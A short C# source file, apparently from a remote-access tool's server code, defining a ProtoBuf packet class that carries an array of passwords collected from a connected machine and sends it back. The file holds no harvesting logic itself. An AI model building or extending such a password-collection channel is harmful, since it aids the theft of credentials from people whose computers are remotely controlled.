using ProtoBuf;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class GetPasswordsResponse : IPacket
    {
        [ProtoMember(1)]
        public string[] Passwords { get; set; }

        public GetPasswordsResponse()
        {
        }

        public GetPasswordsResponse(string[] data)
        {
            this.Passwords = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}